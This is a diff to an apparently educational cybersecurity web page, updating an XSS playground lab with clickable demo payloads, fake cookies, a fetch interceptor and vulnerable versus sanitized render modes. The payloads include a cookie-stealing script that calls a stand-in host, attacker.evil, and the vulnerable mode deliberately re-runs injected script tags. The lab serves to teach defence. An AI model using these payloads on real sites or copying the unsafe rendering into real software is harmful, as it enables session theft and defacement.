@@ -657,19 +657,35 @@ Customer_database.sql</textarea>
 
   <!-- LAB: XSS -->
   <div class="lab">
-    <h3>🩻 Lab 7 — Cross-Site Scripting (XSS) Playground <span class="tag">3 TYPES</span></h3>
-    <p class="lab-desc">XSS = attacker's JavaScript runs in <em>your</em> browser. Try posting a malicious comment below — see what happens in vulnerable vs safe mode.</p>
-    <div class="row" style="margin-top:8px;">
-      <input type="text" id="xssInput" value="<img src=x onerror=&quot;document.getElementById('xssRender').innerHTML='&lt;h2 style=color:red&gt;HACKED!&lt;/h2&gt;Your session cookie would now be stolen.';&quot;>" />
+    <h3>🩻 Lab 7 — Cross-Site Scripting (XSS) Playground <span class="tag">REAL PAYLOADS</span></h3>
+    <p class="lab-desc">XSS = attacker's JavaScript runs in <em>your</em> browser. Pick a payload, click <strong>Render (Vulnerable)</strong>, and watch it execute for real — alerts pop up, "cookies" get stolen, the page gets defaced.</p>
+
+    <div style="margin-bottom:12px;">
+      <div style="color:var(--muted);font-size:13px;margin-bottom:8px;">🎯 Click a payload to load it (then hit Render Vulnerable):</div>
+      <div style="display:grid;gap:6px;">
+        <code style="background:var(--bg-2);padding:8px 12px;border-radius:6px;font-size:12px;cursor:pointer;border:1px solid var(--line);" onclick="loadXssPayload(this)">&lt;script&gt;alert('XSS! Code is running in your browser')&lt;/script&gt;</code>
+        <code style="background:var(--bg-2);padding:8px 12px;border-radius:6px;font-size:12px;cursor:pointer;border:1px solid var(--line);" onclick="loadXssPayload(this)">&lt;img src=x onerror="alert('Stolen cookie: '+document.cookie)"&gt;</code>
+        <code style="background:var(--bg-2);padding:8px 12px;border-radius:6px;font-size:12px;cursor:pointer;border:1px solid var(--line);" onclick="loadXssPayload(this)">&lt;svg onload="document.body.style.background='red';document.title='⚠ HACKED'"&gt;&lt;/svg&gt;</code>
+        <code style="background:var(--bg-2);padding:8px 12px;border-radius:6px;font-size:12px;cursor:pointer;border:1px solid var(--line);" onclick="loadXssPayload(this)">&lt;script&gt;fetch('https://attacker.evil/log?stolen='+encodeURIComponent(document.cookie))&lt;/script&gt;</code>
+        <code style="background:var(--bg-2);padding:8px 12px;border-radius:6px;font-size:12px;cursor:pointer;border:1px solid var(--line);" onclick="loadXssPayload(this)">&lt;a href="javascript:alert('Clicked link → XSS')"&gt;Click for a free iPhone&lt;/a&gt;</code>
+      </div>
     </div>
+
+    <input type="text" id="xssInput" value="<script>alert('XSS! Code is running in your browser')</script>" />
+
     <div style="display:flex;gap:10px;margin-top:10px;flex-wrap:wrap;">
       <button onclick="xssVulnerable()" class="danger">😱 Render (Vulnerable)</button>
       <button onclick="xssSafe()">✅ Render (Sanitized)</button>
-      <button onclick="document.getElementById('xssRender').innerHTML='Comments will appear here...'" class="ghost">Clear</button>
+      <button onclick="xssClear()" class="ghost">Clear</button>
     </div>
-    <div style="margin-top:12px;font-size:12px;color:var(--muted);">Comment section:</div>
+    <div style="margin-top:12px;font-size:12px;color:var(--muted);">Comment section (simulating a forum where users post comments):</div>
     <div class="xss-render" id="xssRender">Comments will appear here...</div>
-    <p style="margin-top:16px;font-size:13px;color:var(--muted);"><strong>Three flavours:</strong> <strong>Reflected</strong> (search URLs), <strong>Stored</strong> (forum posts — most dangerous), <strong>DOM-based</strong> (client-side JS rewrites the page). All fixed by <em>escaping output</em>.</p>
+
+    <div style="margin-top:12px;font-size:12px;color:var(--muted);">📜 Attacker's exfiltration log (what got captured):</div>
+    <div class="trojan-log" id="xssLog">Waiting for malicious payload to execute…<br></div>
+
+    <p style="margin-top:16px;font-size:13px;color:var(--muted);"><strong>Three flavours:</strong> <strong>Reflected</strong> (search URLs), <strong>Stored</strong> (forum posts — most dangerous), <strong>DOM-based</strong> (client-side JS rewrites the page). All fixed by <em>escaping output</em> with frameworks like React/Vue, or libraries like DOMPurify.</p>
+    <p style="margin-top:8px;font-size:12px;color:var(--muted);"><em>Note: a fake <code>session=abc123xyz; userId=42; csrf=tok987</code> cookie is set on this page for demo purposes — that's what the payloads will "steal".</em></p>
   </div>
 
   <!-- LAB: MITM -->
@@ -1374,15 +1390,85 @@ Customer_database.sql</textarea>
   }
 
   // ============ XSS Playground ============
+  // Set fake cookies so payloads have something to "steal"
+  try {
+    document.cookie = 'session=abc123xyz; path=/';
+    document.cookie = 'userId=42; path=/';
+    document.cookie = 'csrf=tok987; path=/';
+  } catch (e) {}
+
+  // Intercept fetch() so attacker-style fetch('https://attacker.evil/...') gets logged
+  // rather than actually firing (which would fail CORS anyway).
+  (function() {
+    const origFetch = window.fetch;
+    window.fetch = function(url, opts) {
+      const u = String(url || '');
+      if (u.includes('attacker.evil') || u.includes('evil.com') || u.includes('attacker-c2')) {
+        logXss('📡 fetch() intercepted → ' + u);
+        // Return a successful-looking promise so the payload doesn't error
+        return Promise.resolve(new Response('{"ok":true}', { status: 200 }));
+      }
+      return origFetch.apply(this, arguments);
+    };
+  })();
+
+  function logXss(msg) {
+    const log = document.getElementById('xssLog');
+    if (!log) return;
+    const t = new Date().toISOString().split('T')[1].slice(0, 8);
+    log.innerHTML += `<div>[${t}] ${msg}</div>`;
+    log.scrollTop = log.scrollHeight;
+  }
+
+  // Decode HTML entities back to raw chars (the payload buttons use &lt; etc. for display)
+  function htmlDecode(s) {
+    const ta = document.createElement('textarea');
+    ta.innerHTML = s;
+    return ta.value;
+  }
+
+  function loadXssPayload(el) {
+    document.getElementById('xssInput').value = htmlDecode(el.textContent);
+    logXss('payload loaded — click "Render (Vulnerable)" to execute');
+  }
+
+  function xssClear() {
+    document.getElementById('xssRender').innerHTML = 'Comments will appear here...';
+    document.body.style.background = ''; // revert any defacement
+    document.title = 'Cybersec 101 · Day 2 — Understanding Hacker Attacks';
+  }
+
   function xssVulnerable() {
     const input = document.getElementById('xssInput').value;
-    document.getElementById('xssRender').innerHTML = '<strong>User comment:</strong> ' + input;
+    const render = document.getElementById('xssRender');
+    render.innerHTML = '<strong>User comment:</strong> ' + input;
+    logXss('🚨 vulnerable render: innerHTML set with raw user input');
+
+    // Manually re-execute any <script> tags — innerHTML doesn't auto-run them due to a
+    // browser security default, but a vulnerable framework (or eval, or document.write,
+    // or dangerouslySetInnerHTML followed by reload) absolutely WILL run them.
+    // We simulate that by cloning each script node and re-inserting it.
+    const scripts = render.querySelectorAll('script');
+    scripts.forEach(oldScript => {
+      const newScript = document.createElement('script');
+      for (const attr of Array.from(oldScript.attributes)) {
+        newScript.setAttribute(attr.name, attr.value);
+      }
+      newScript.textContent = oldScript.textContent;
+      try {
+        oldScript.parentNode.replaceChild(newScript, oldScript);
+        logXss('💥 <script> executed: ' + oldScript.textContent.slice(0, 80));
+      } catch (e) {
+        logXss('script error: ' + e.message);
+      }
+    });
   }
+
   function xssSafe() {
     const input = document.getElementById('xssInput').value;
-    // Escape HTML entities
     const escaped = input.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
     document.getElementById('xssRender').innerHTML = '<strong>User comment:</strong> ' + escaped;
+    logXss('✅ safe render: HTML entities escaped — payload neutralised');
   }
 
   // ============ MITM ============
